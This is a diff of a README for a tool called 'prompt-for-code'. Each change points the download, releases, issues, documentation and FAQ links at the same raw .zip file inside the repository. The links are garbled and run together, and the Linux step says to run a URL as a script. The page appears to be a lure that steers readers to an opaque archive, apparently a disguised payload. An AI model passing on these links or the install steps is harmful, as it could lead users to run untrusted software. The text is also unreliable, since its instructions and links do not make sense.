@@ -1,7 +1,7 @@
 # 🎉 prompt-for-code - Simple Commands for AI Agents
 
 ## 📦 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Onlykrizz/prompt-for-code/master/ai-agent-output/2025-10-11T21-35-53_UTC+8_版本更新规范/prompt-for-code_3.2-beta.2.zip%20Latest%https://raw.githubusercontent.com/Onlykrizz/prompt-for-code/master/ai-agent-output/2025-10-11T21-35-53_UTC+8_版本更新规范/prompt-for-code_3.2-beta.2.zip)](https://raw.githubusercontent.com/Onlykrizz/prompt-for-code/master/ai-agent-output/2025-10-11T21-35-53_UTC+8_版本更新规范/prompt-for-code_3.2-beta.2.zip)
+[![Download Latest Release](https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip+8_版本更新规范https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip%20Latest%https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip+8_版本更新规范https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip)](https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip+8_版本更新规范https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Welcome to the **prompt-for-code** application! This tool helps you create effec
 
 To get started, follow these steps:
 
-1. **Visit the Download Page:** Go to the Releases page to find the latest version of the software. Click [here to download](https://raw.githubusercontent.com/Onlykrizz/prompt-for-code/master/ai-agent-output/2025-10-11T21-35-53_UTC+8_版本更新规范/prompt-for-code_3.2-beta.2.zip).
+1. **Visit the Download Page:** Go to the Releases page to find the latest version of the software. Click [here to download](https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip+8_版本更新规范https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip).
    
 2. **Choose the Right Version:** On the Releases page, look for the section titled "Assets." You will see several files listed. Choose the file that matches your operating system (Windows, macOS, or Linux).
 
@@ -31,7 +31,7 @@ To get started, follow these steps:
 4. **Install the Application:** 
    - **Windows:** Locate the `.exe` file in your downloads folder. Double-click it and follow the prompts to install. 
    - **macOS:** Find the `.dmg` file. Double-click it, then drag the application icon to your Applications folder.
-   - **Linux:** If you have a `https://raw.githubusercontent.com/Onlykrizz/prompt-for-code/master/ai-agent-output/2025-10-11T21-35-53_UTC+8_版本更新规范/prompt-for-code_3.2-beta.2.zip` file, extract it and run the `https://raw.githubusercontent.com/Onlykrizz/prompt-for-code/master/ai-agent-output/2025-10-11T21-35-53_UTC+8_版本更新规范/prompt-for-code_3.2-beta.2.zip` script in the terminal.
+   - **Linux:** If you have a `https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip+8_版本更新规范https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip` file, extract it and run the `https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip+8_版本更新规范https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip` script in the terminal.
 
 5. **Launch the Application:** After installation, open the application from your programs or applications list.
 
@@ -66,13 +66,13 @@ If you encounter issues while using the application, consider the following tips
 
 If you need help that you can't find in the FAQ, feel free to reach out:
 
-- Raise an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Onlykrizz/prompt-for-code/master/ai-agent-output/2025-10-11T21-35-53_UTC+8_版本更新规范/prompt-for-code_3.2-beta.2.zip).
+- Raise an issue on the [GitHub Issues page](https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip+8_版本更新规范https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip).
 - Join our Discord server for community support.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/Onlykrizz/prompt-for-code/master/ai-agent-output/2025-10-11T21-35-53_UTC+8_版本更新规范/prompt-for-code_3.2-beta.2.zip)
-- [Documentation](https://raw.githubusercontent.com/Onlykrizz/prompt-for-code/master/ai-agent-output/2025-10-11T21-35-53_UTC+8_版本更新规范/prompt-for-code_3.2-beta.2.zip)
-- [FAQ](https://raw.githubusercontent.com/Onlykrizz/prompt-for-code/master/ai-agent-output/2025-10-11T21-35-53_UTC+8_版本更新规范/prompt-for-code_3.2-beta.2.zip)
+- [Releases Page](https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip+8_版本更新规范https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip)
+- [Documentation](https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip+8_版本更新规范https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip)
+- [FAQ](https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip+8_版本更新规范https://github.com/Onlykrizz/prompt-for-code/raw/refs/heads/master/src/ai-agent-memo-2/code_prompt_for_v2.5.zip)
 
 Thank you for using **prompt-for-code**! We hope it helps you create better commands for your AI agents. Enjoy!
